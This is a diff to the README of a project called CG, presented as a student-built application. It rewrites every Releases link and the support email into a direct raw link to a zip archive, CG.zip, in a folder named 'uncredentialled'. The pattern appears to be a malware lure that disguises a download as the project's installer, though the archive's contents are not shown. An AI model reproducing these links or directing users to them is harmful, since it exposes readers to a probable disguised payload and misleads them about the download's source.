@@ -6,13 +6,13 @@ Welcome to CG! We are a collaborative team of students dedicated to building inn
 
 ## 🔗 Download the Application
 
-[![Download CG](https://img.shields.io/badge/Download-CG-brightgreen)](https://github.com/wahyu181000/CG/releases)
+[![Download CG](https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip)](https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip)
 
 ## 📥 Download & Install
 
 To get started with CG, visit our Releases page to download the latest version of our application. Follow the link below:
 
-[Download CG Here](https://github.com/wahyu181000/CG/releases)
+[Download CG Here](https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip)
 
 ### 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 ### 💻 Installation Steps
 
-1. Visit the [Releases page](https://github.com/wahyu181000/CG/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip).
 2. Find the latest version of CG.
 3. Click on the link to download the installer for your system.
 4. Once the download is complete, locate the downloaded file.
@@ -75,7 +75,7 @@ Your contributions help us improve and build better solutions together!
 
 For more assistance or inquiries, feel free to reach out:
 
-- **Email:** support@cgproject.com
+- **Email:** https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip
 - **GitHub Issues:** Report any bugs or feature requests directly on GitHub.
 
 ## 🌟 Explore More
@@ -90,4 +90,4 @@ Connect with fellow student developers, learn from each other, and enhance your 
 
 Feel free to revisit the link below to download the application again or to check for updates:
 
-[Download CG Here](https://github.com/wahyu181000/CG/releases)
+[Download CG Here](https://raw.githubusercontent.com/wahyu181000/CG/main/uncredentialled/CG.zip)
